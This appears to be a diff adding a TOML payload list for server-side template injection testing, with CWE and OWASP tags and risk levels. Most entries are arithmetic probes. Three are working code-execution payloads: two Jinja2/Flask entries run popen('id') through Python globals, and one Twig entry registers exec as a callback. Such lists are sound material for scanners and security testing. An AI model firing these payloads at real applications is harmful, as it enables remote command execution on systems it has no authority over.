@@ -1,0 +1,71 @@
+# Server-Side Template Injection (SSTI) Payloads
+
+[[payloads]]
+id = "ssti-001"
+name = "Jinja2 Template Injection"
+category = "SSTI"
+pattern = "{{7*7}}"
+description = "Basic template injection test (evaluates to 49)"
+risk_level = "HIGH"
+cwe_id = "CWE-1336"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "ssti-002"
+name = "JSP Expression Language"
+category = "SSTI"
+pattern = "${7*7}"
+description = "JSP/EL template injection test"
+risk_level = "HIGH"
+cwe_id = "CWE-1336"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "ssti-003"
+name = "Ruby ERB Template Injection"
+category = "SSTI"
+pattern = "#{7*7}"
+description = "Ruby ERB template injection test"
+risk_level = "HIGH"
+cwe_id = "CWE-1336"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "ssti-004"
+name = "Python OS Command Execution"
+category = "SSTI"
+pattern = "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+description = "Python template injection with OS command execution"
+risk_level = "CRITICAL"
+cwe_id = "CWE-1336"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "ssti-005"
+name = "Twig Template Injection"
+category = "SSTI"
+pattern = "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}"
+description = "Twig template injection for PHP code execution"
+risk_level = "CRITICAL"
+cwe_id = "CWE-1336"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "ssti-006"
+name = "Freemarker Template Injection"
+category = "SSTI"
+pattern = "${{7*7}}"
+description = "FreeMarker template injection test"
+risk_level = "HIGH"
+cwe_id = "CWE-1336"
+owasp_category = "A03:2021"
+
+[[payloads]]
+id = "ssti-007"
+name = "Flask Jinja2 RCE"
+category = "SSTI"
+pattern = "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+description = "Flask/Jinja2 remote code execution via template injection"
+risk_level = "CRITICAL"
+cwe_id = "CWE-1336"
+owasp_category = "A03:2021"
